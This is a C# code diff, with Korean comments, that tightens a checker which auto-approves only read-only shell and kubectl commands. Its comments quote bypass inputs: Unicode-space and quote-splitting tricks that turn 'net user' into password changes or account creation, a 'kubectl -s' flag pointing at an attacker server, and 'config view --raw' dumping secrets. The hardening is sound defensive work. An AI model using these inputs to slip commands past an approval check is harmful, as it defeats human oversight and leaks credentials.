@@ -30,11 +30,16 @@ public static class ReadOnlyCommands
     public static bool IsReadOnly(string command, CommandShell shell, out string reason)
     {
         reason = "";
-        command = command.Trim();
+        // 특수 공백·제어 문자 검사는 다듬기 전 원문으로 한다 — Trim() 은 앞뒤의 NBSP·U+3000 등을 지우지만,
+        // 실제로 서버에 보내는 것은 원문이라 끝의 NBSP 가 인자가 된다 (cmd: net user administrator <NBSP> → 비밀번호 변경)
+        if (command.Any(c => char.IsWhiteSpace(c) && c is not ' ' and not '\t' and not '\r' and not '\n'))
+        { reason = "특수 공백 문자"; return false; }
+        command = command.Trim(' ', '\t', '\r', '\n');
         if (command.Length == 0 || command.Length > 4000) { reason = "빈 명령이거나 너무 김"; return false; }
         // 제어 문자: 줄바꿈(여러 명령)·Ctrl-U/Ctrl-W(줄 지우기)·ESC·DEL·C1 등은 보이는 글자와 실제 실행이 달라질 수 있다 (send_to_terminal 도 이 검사에 기댐). 탭만 허용
         if (command.Any(c => (c < 0x20 && c != '\t') || (c >= 0x7f && c <= 0x9f) || c is '\u2028' or '\u2029'))
         { reason = "제어 문자"; return false; }
+        // (특수 공백 문자 — NBSP · U+3000 등은 셸마다 단어를 나누는 기준이 달라(sh·cmd 는 나누지 않고 PowerShell 은 나눔) 맨 위에서 원문으로 거부했다)
         if (ApprovalDialog.IsDangerous(command)) { reason = "위험 명령 패턴"; return false; }
         return shell switch
         {
@@ -78,20 +83,27 @@ public static class ReadOnlyCommands
         return parts.Select(p => p.Trim()).Where(p => p.Length > 0).ToList();
     }
 
-    /// <summary>공백 기준 토큰 (따옴표 안 공백 유지, 따옴표 제거)</summary>
+    /// <summary>
+    /// 공백 기준 토큰 (따옴표 안 공백 유지, 따옴표 제거).
+    /// - 빈 따옴표('' · "")도 빈 토큰으로 남긴다 — 셸은 빈 인자를 넘기므로(kubectl -n '' delete … 의 '' 가 -n 의 값), 버리면 하위 명령 판정이 어긋난다
+    /// - 단어는 공백·탭(·줄바꿈)에서만 나눈다 — sh 는 NBSP·U+3000 같은 유니코드 공백에서 나누지 않는다.
+    ///   그런 문자는 토큰에 그대로 남겨 "-n " 처럼 알아볼 수 없는 옵션이 되게 한다 (판정은 보수적으로 읽기 전용 아님)
+    /// </summary>
     private static List<string> Tokens(string s, string quotes)
     {
         var list = new List<string>();
         var sb = new StringBuilder();
+        var has = false;   // 지금 토큰이 시작됐는가 (빈 따옴표만 있어도 토큰)
         char quote = '\0';
         foreach (var c in s)
         {
             if (quote != '\0') { if (c == quote) quote = '\0'; else sb.Append(c); continue; }
-            if (quotes.IndexOf(c) >= 0) { quote = c; continue; }
-            if (char.IsWhiteSpace(c)) { if (sb.Length > 0) { list.Add(sb.ToString()); sb.Clear(); } continue; }
+            if (quotes.IndexOf(c) >= 0) { quote = c; has = true; continue; }
+            if (c is ' ' or '\t' or '\n' or '\r') { if (has || sb.Length > 0) { list.Add(sb.ToString()); sb.Clear(); has = false; } continue; }
             sb.Append(c);
+            has = true;
         }
-        if (sb.Length > 0) list.Add(sb.ToString());
+        if (has || sb.Length > 0) list.Add(sb.ToString());
         return list;
     }
 
@@ -274,6 +286,8 @@ public static class ReadOnlyCommands
         foreach (var seg in SplitSegments(command, BothQuotes, singleAmpIsSeparator: false))
         {
             var t = Tokens(seg, BothQuotes);
+            // 빈 인자('' "")는 읽기 전용으로 보지 않는다 — 하위 명령 자리의 빈 인자를 "인자 없음" 과 구분하지 못하는 판정이 있다 (ip '' add …)
+            if (t.Any(x => x.Length == 0)) { reason = "빈 인자"; return false; }
             // sudo / timeout / nice 앞부분 건너뛰기
             while (t.Count > 0)
             {
@@ -362,17 +376,32 @@ public static class ReadOnlyCommands
             case "kubectl":
             {
                 if (a.Any(x => x.StartsWith("--kubeconfig", StringComparison.Ordinal))) return false;   // exec 자격 증명 플러그인 실행 가능
-                // -s/--server 로 API 서버 주소를 바꾸면 kubeconfig 의 토큰·클라이언트 인증서가 그 서버로 간다 (kubectl get pods -s https://공격자)
+                // -s/--server 로 API 서버 주소를 바꾸면 kubeconfig 의 토큰·클라이언트 인증서가 그 서버로 간다 (kubectl get pods -s https://공격자).
+                // 옵션은 run_kubectl 과 같은 pflag 해석(KubectlArgs.Check)으로 본다: 짧은 옵션 묶음(-As x · -Asx · -ws x), 긴 이름의 _ 표기
+                // (--tls_server_name · --profile_output), 값 옵션 뒤의 --(-l -- --server=x), 로컬 파일 읽기·쓰기(-o go-template-file= ·
+                // --profile-output · --log-file · --kuberc), 플러그인(kubectl-이름 실행). 그 서버 kubeconfig 안의 --context·--cluster·--user 선택만 허용
+                if (KubectlArgs.Check(a, fixedCluster: false) != null) return false;
+                if (a.Contains("--")) return false;   // 조회 명령에는 -- 가 필요 없다 (값인지 끝 표시인지 해석이 엇갈릴 수 있어 승인 받기)
                 if (a.Any(x => (x.StartsWith("-s", StringComparison.Ordinal) && !x.StartsWith("--", StringComparison.Ordinal)) ||
-                               LongPrefix(x, "server", "tls-server-name"))) return false;
-                if (!SubStart(a, out var i, new[] { "-A", "--all-namespaces" }, new[] { "-n", "--namespace", "--context", "--cluster", "--user" })) return false;
+                               KubectlArgs.ShortHas(x, "s") || LongPrefix(KubectlArgs.LongName(x), "server", "tls-server-name"))) return false;
+                // 하위 명령 찾기는 run_kubectl 과 같은 규칙(KubectlArgs.SubcommandIndex): 값 받는 전역 옵션(-n x · -v 6 · --context x)은 값까지 건너뛰고,
+                // 모르는 옵션이 앞에 있으면 어디가 하위 명령인지 확신할 수 없어 승인 받기
+                var i = KubectlArgs.SubcommandIndex(a);
+                if (i < 0) return false;
                 var sub = At(a, i);
-                // --raw 는 config view 에서 클라이언트 키·토큰을 가리지 않고 출력한다 — config 판정보다 먼저 막는다
-                // (예전에는 config 를 먼저 허용하고 돌려줘 'kubectl config view --raw' 가 자동 승인됐다)
-                if (a.Any(x => x == "dump" || x.StartsWith("--raw", StringComparison.Ordinal) || x.StartsWith("--output-directory", StringComparison.Ordinal))) return false;
+                // --raw · --flatten 은 config view 에서 클라이언트 키·토큰을 가리지 않고 출력한다 (kubectl view.go: Flatten 이면 가리기를 건너뜀) —
+                // config 판정보다 먼저 막는다 (예전에는 config 를 먼저 허용하고 돌려줘 'kubectl config view --raw' 가 자동 승인됐다)
+                if (a.Any(x => x == "dump" || KubectlArgs.LongName(x).StartsWith("--raw", StringComparison.Ordinal) ||
+                               KubectlArgs.LongName(x).StartsWith("--flatten", StringComparison.Ordinal) ||
+                               KubectlArgs.LongName(x).StartsWith("--output-directory", StringComparison.Ordinal))) return false;
+                // -f/--filename · -k/--kustomize 는 로컬 파일(또는 URL)을 읽는다 — 읽기 오류에 내용 일부가 찍힐 수 있다. logs 의 -f 는 --follow
+                if (sub != "logs" && a.Any(x => KubectlArgs.ShortHas(x, "fk") || LongPrefix(KubectlArgs.LongName(x), "filename", "kustomize"))) return false;
+                if (sub == "logs" && a.Any(x => KubectlArgs.ShortHas(x, "k") || LongPrefix(KubectlArgs.LongName(x), "filename", "kustomize"))) return false;
                 // Secret 내용(base64 값)을 출력에 담는 조회는 자동 승인하지 않는다 (get secret -o yaml, describe 는 값을 가리지만 같이 막는다)
                 if (a.Skip(i + 1).Any(KubectlSecretRef)) return false;
-                if (sub == "config") return At(a, i + 1) is "view" or "get-contexts" or "current-context" && NoMutating(a, i + 2);
+                // config view 는 옵션이 없어도 가리는 것이 *-data · token 뿐이라(client-go ShortenConfig) basic 인증 password ·
+                // auth-provider(OIDC) refresh-token · client-secret · exec env 는 그대로 나온다 → 자동 승인하지 않는다 (이름만 보이는 두 가지만)
+                if (sub == "config") return At(a, i + 1) is "get-contexts" or "current-context" && NoMutating(a, i + 2);
                 if (sub == "auth") return At(a, i + 1) == "can-i";   // can-i 는 권한 확인만 (뒤에 delete 등이 와도 실행 아님)
                 // --cache-dir 는 그 경로에 discovery 캐시 파일을 쓴다 (sudo 면 아무 폴더에나)
                 if (a.Any(x => x.StartsWith("--cache-dir", StringComparison.Ordinal))) return false;
@@ -745,6 +774,7 @@ public static class ReadOnlyCommands
             if (lead is '$' or '@' or '[' or '\'' or '"' or '-' or '!' || char.IsDigit(lead)) continue;   // 식 모드 (명령 이름 아님)
             if (Regex.IsMatch(s, @"^\.[A-Za-z_]\w*(\s|$)")) continue;   // (…).Count 같은 속성 접근 (메서드 호출은 위에서 거부)
             var t = Tokens(s, BothQuotes);
+            if (t.Any(x => x.Length == 0)) { reason = "빈 인자"; return false; }
             if (t.Count == 0) continue;
             var first = t[0];
             if (first is "%" || first.Equals("foreach", StringComparison.OrdinalIgnoreCase) || first.Equals("ForEach-Object", StringComparison.OrdinalIgnoreCase))
@@ -763,6 +793,10 @@ public static class ReadOnlyCommands
                 // 식으로 건너뛰어지므로 WinArgsOk 가 보지 못한다 — net user ('bob','pw','/add') · $a='bob','pw','/add'; net user $a · net user @a
                 if (bare.IndexOfAny(new[] { '$', '@', '(', ')', '{', '}', ',', '[' }) >= 0)
                 { reason = $"기본 명령에 식·변수·배열 인자: {seg}"; return false; }
+                // 인자 안의 큰따옴표: PowerShell 5.1 은 " 가 든 인자를 이스케이프 없이 통째로 감싸 넘겨, 받는 프로그램이 여러 인자로 나눈다
+                // (net user 'bob" "pw" "/add' → net.exe 는 bob · pw · /add 를 받음). 판정기가 본 인자 경계와 달라지므로 받지 않는다
+                if (t.Skip(1).Any(x => x.IndexOf('"') >= 0 || x.IndexOf('\\') >= 0 && x.IndexOf('\'') >= 0))
+                { reason = $"기본 명령 인자에 따옴표: {seg}"; return false; }
                 if (!WinArgsOk(exe, t.Skip(1).ToList())) { reason = $"쓰기 가능한 옵션: {seg}"; return false; }
                 continue;
             }
@@ -790,12 +824,14 @@ public static class ReadOnlyCommands
         foreach (var seg in SplitSegments(command, DoubleQuoteOnly, singleAmpIsSeparator: true))
         {
             var t = Tokens(seg, DoubleQuoteOnly);
+            if (t.Any(x => x.Length == 0)) { reason = "빈 인자"; return false; }
             if (t.Count == 0) continue;
             var first = t[0].EndsWith(".exe", StringComparison.OrdinalIgnoreCase) ? t[0][..^4] : t[0];
             var args = t.Skip(1).ToList();
             if (first.Equals("dir", StringComparison.OrdinalIgnoreCase) || first.Equals("type", StringComparison.OrdinalIgnoreCase) ||
                 first.Equals("echo", StringComparison.OrdinalIgnoreCase) ||
-                first.Equals("sort", StringComparison.OrdinalIgnoreCase) && !args.Any(x => x.StartsWith("/o", StringComparison.OrdinalIgnoreCase) || x.StartsWith("-o", StringComparison.OrdinalIgnoreCase)) ||
+                // sort 는 /o 출력 파일 옵션이 있어 WinArgsOk 의 인자 경계 검사·조각 분할을 거친다 (sort /+1\" /o out.txt /+1\" x 우회)
+                first.Equals("sort", StringComparison.OrdinalIgnoreCase) && WinArgsOk("sort", args) ||
                 first.Equals("set", StringComparison.OrdinalIgnoreCase) && !seg.Contains('='))
                 continue;
             if (WinNative.Contains(first) && WinArgsOk(first, args)) continue;
@@ -808,6 +844,16 @@ public static class ReadOnlyCommands
     /// <summary>Windows 기본 명령의 읽기 전용 사용 형태</summary>
     private static bool WinArgsOk(string exe, List<string> a)
     {
+        // 인자 경계: 판정기가 본 인자 하나가 받는 프로그램에서 여럿으로 나뉠 수 있다 —
+        // query.exe 는 quser·qwinsta 를 부르며 인자를 따옴표 없이 다시 이어 붙이고, PowerShell 5.1 은 끝이 \ 인 공백 포함 인자를
+        // "a b\" 로 감싸(\ 이스케이프 없음) 다음 인자와 합쳐지며, cmd 의 x\" … \" 는 받는 쪽에서 \" 가 글자 따옴표가 된다.
+        // 그래서 ① 경계를 흐리는 형태(큰따옴표, 공백이 있고 \ 로 끝남, \ 뒤 공백)는 받지 않고
+        // ② 아래 옵션 검사는 각 인자를 공백으로 나눈 조각으로 한다 (query user 'x /server:host' 의 /server 도 보이게)
+        if (a.Any(x => x.IndexOf('"') >= 0 || x.Contains("\\ ") || x.Contains("\\\t") ||
+                       x.EndsWith('\\') && x.Any(c => c is ' ' or '\t')))
+            return false;
+        var origCount = a.Count;   // 인자 수는 원래 인자로 센다 — net localgroup "Remote Desktop Users" 는 인자 2개 (net.exe 는 다시 나누지 않음)
+        a = a.SelectMany(x => x.Split(new[] { ' ', '\t' }, StringSplitOptions.RemoveEmptyEntries)).ToList();
         string A(int i) => i < a.Count ? a[i].ToLowerInvariant() : "";
         bool Has(params string[] xs) => a.Any(x => xs.Any(y => x.Equals(y, StringComparison.OrdinalIgnoreCase)));
         bool HasRx(string pattern) => a.Any(x => Regex.IsMatch(x, pattern, RegexOptions.IgnoreCase));
@@ -827,11 +873,14 @@ public static class ReadOnlyCommands
                 if (a.Any(x => x.StartsWith("/format", StringComparison.OrdinalIgnoreCase) &&
                                !Regex.IsMatch(x, @"^/format:(list|table|csv|value|htable|hform|rawxml|xml|textvaluelist)$", RegexOptions.IgnoreCase)))
                     return false;   // 원격 XSL(스크립트 실행) 방지
+                // 동사 검사는 쉼표로도 나눈 조각으로 (wmic os list,call … 처럼 붙여 쓴 동사를 놓치지 않게 — 보수적으로)
                 return a.Any(x => x.Equals("get", StringComparison.OrdinalIgnoreCase) || x.StartsWith("list", StringComparison.OrdinalIgnoreCase))
-                       && !Has("call", "create", "delete", "set");
+                       && !a.SelectMany(x => x.Split(',')).Any(x => x.Trim() is var v &&
+                              (v.Equals("call", StringComparison.OrdinalIgnoreCase) || v.Equals("create", StringComparison.OrdinalIgnoreCase) ||
+                               v.Equals("delete", StringComparison.OrdinalIgnoreCase) || v.Equals("set", StringComparison.OrdinalIgnoreCase)));
             case "route": return A(0) == "print" && !HasRx(@"^[-/][fp]$");
             case "arp": return A(0) is "-a" or "-g" or "/a" && !HasRx(@"^[-/][ds]$");
-            case "w32tm": return (A(0).StartsWith("/query") || A(0) == "/tz" || A(0) == "/stripchart") && !HasRx(@"^/(config|resync|register|unregister|debug)");
+            case "w32tm": return (A(0).StartsWith("/query") || A(0) == "/tz" || A(0) == "/stripchart") && !HasRx(@"^/(config|resync|register|unregister|debug)(:|$)");   // /query /configuration 은 조회
             case "bcdedit": return a.All(x => !(x.StartsWith('/') || x.StartsWith('-')) || x.Equals("/enum", StringComparison.OrdinalIgnoreCase) || x.Equals("/v", StringComparison.OrdinalIgnoreCase));
             case "cmdkey": return a.Count > 0 && a.All(x => x.StartsWith("/list", StringComparison.OrdinalIgnoreCase));
             case "klist": return !Has("purge", "purge_bind", "add_bind");
@@ -839,8 +888,9 @@ public static class ReadOnlyCommands
             case "net":
                 if (a.Any(x => x.StartsWith('/') || x.StartsWith('-') || x.Contains('*') || x.IndexOfAny(new[] { ',', ';', '=' }) >= 0)) return false;
                 return (A(0) is "start" or "share" or "session" or "statistics" or "config" or "view" or "use" or "accounts" && a.Count == 1)
-                       || (A(0) is "localgroup" or "user" or "group" && a.Count <= 2);
+                       || (A(0) is "localgroup" or "user" or "group" && origCount <= 2);
             case "query": return A(0) is "user" or "session" or "process" or "termserver";
+            case "sort": return !HasRx(@"^[-/]o");   // /o 출력 파일 (긴 형태 /output 포함)
             default: return true;   // hostname, whoami, systeminfo, netstat, tasklist, quser, nslookup, ping, tracert, getmac ...
         }
     }
